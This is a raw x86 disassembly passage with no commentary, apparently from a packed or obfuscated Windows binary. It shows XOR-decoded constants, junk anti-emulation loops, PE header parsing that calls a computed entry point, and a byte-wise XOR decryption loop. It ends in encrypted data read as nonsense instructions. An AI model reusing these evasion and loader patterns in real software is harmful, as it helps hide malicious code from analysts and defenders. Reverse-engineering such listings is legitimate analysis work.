  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d658
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d45c
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d658,eax
  41095e:	mov    eax,ds:0x41d45c
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d45c
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d2e0,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d534,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d2e0
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d45c
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d534
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d2e0
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d45c
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d45c
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d45c
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d4e0,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d4d8,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d45c
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff3d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d2dc
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d4e4
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d45c
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ff9f
  410dc5:	push   0x41ff81
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d47c
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d3d2
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d278
  411086:	mov    ebx,DWORD PTR ds:0x41d27c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41fede
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x3def9fd3
  411322:	inc    eax
  411323:	push   edi
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x52]
  41132c:	inc    edx
  41132d:	test   al,0xe6
  41132f:	mov    al,cl
  411331:	dec    edi
  411332:	mov    ecx,0xcb6d0d63
  411337:	adc    DWORD PTR [eax-0x447aaa59],0xffffffd3
  41133e:	fwait
  41133f:	jb     0x411317
  411341:	das    
  411342:	inc    esp
  411344:	push   ecx
  411345:	jns    0x4112de
  411347:	pop    ecx
  411348:	stc    
  411349:	xchg   ebp,eax
  41134a:	test   DWORD PTR [ebp+0x3],0xf5794f0
  411351:	mov    dl,0xd0
  411353:	call   0x810a5519
  411358:	inc    ecx
  411359:	sbb    ecx,DWORD PTR [esi-0x68]
  41135c:	push   edi
  41135d:	mov    dl,0xbe
  41135f:	cmp    al,0x4f
  411361:	jle    0x4112fb
  411363:	enter  0x3c9d,0x7b
  411367:	mov    edi,0xe8e79e22
  41136c:	push   ebp
  41136d:	lds    esp,FWORD PTR [edx+eax*4+0x767e6c08]
  411374:	add    al,0x9d
  411376:	cdq    
  411377:	dec    ebx
  411378:	mov    eax,0x526654bf
  41137d:	cdq    
  41137e:	or     bh,ah
  411380:	sbb    ecx,ecx
  411382:	clc    
  411383:	jmp    0x41131e
  411385:	jp     0x41136d
  411387:	pop    edx
  411388:	or     DWORD PTR [eax-0x3b2baa3d],ebp
  41138e:	jg     0x41134e
  411390:	pop    ss
  411391:	stos   DWORD PTR es:[edi],eax
  411392:	mov    BYTE PTR [edi+0x14a50930],0xc1
  411399:	jae    0x4113d6
  41139b:	xor    eax,0x589412c4
  4113a0:	cdq    
  4113a1:	cs mov ebp,0x2b259a3b
  4113a7:	ret    0x1ad5
  4113aa:	(bad)  
